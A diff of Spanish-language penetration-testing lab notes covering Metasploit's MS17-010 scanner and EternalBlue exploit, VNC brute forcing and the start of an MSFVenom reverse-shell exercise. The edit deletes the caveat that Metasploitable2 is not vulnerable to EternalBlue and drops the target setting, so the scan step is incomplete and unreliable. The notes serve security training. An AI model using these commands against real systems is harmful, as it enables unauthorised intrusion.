@@ -209,14 +209,10 @@ services
 ### Explotación
 
 ```bash
-# NOTA: Metasploitable2 es Linux y NO es vulnerable a EternalBlue.
-# Este ejercicio requiere una máquina Windows sin parchear (ej: Windows 7 SP1 x64).
-
 # 1. Escanear para detectar MS17-010
 msfconsole
 use auxiliary/scanner/smb/smb_ms17_010
-set RHOSTS <IP_WINDOWS>
-run
+exploit
 
 # 2. Si es vulnerable, seleccionar exploit
 use exploit/windows/smb/ms17_010_eternalblue
@@ -367,6 +363,7 @@ exploit
 ![](attachments/{1C9E4E2D-2719-4326-947A-A12C9E3D9066}.png)
 ![](attachments/{9AEA9537-54AD-4AAB-BA67-7C60DE48BC91}.png)
 ![](attachments/{733E61A8-EFDD-4CEB-8DD9-B3A97A707C3C}.png)
+![](attachments/{097C3816-A403-43F6-A016-CBA3AFEC1F0C}.png)
 
 ### VNC Server — Fuerza bruta
 
@@ -379,6 +376,7 @@ nmap -sV -p 5900 <IP_VICTIMA>
 # 2. Fuerza bruta VNC
 use auxiliary/scanner/vnc/vnc_login
 
+# un poquito más rápido
 set THREADS 5
 run
 
@@ -386,11 +384,12 @@ run
 vncviewer <IP_VICTIMA>:5900
 ```
 
----
+![](attachments/{17B7F19A-A1F6-4F74-8B24-0A6CA9617EA8}.png)
+![](attachments/{D9EA8776-8B50-4983-9BC1-CDD94357CC15}.png)
+![](attachments/{72EA387F-4081-41DB-A0DC-9181AA291070}.png)
+
 
 ## Ejercicio 9 — MSFVenom
-
-### Guía de comandos
 
 ```bash
 # 1. Generar payload Linux reverse shell con MSFVenom
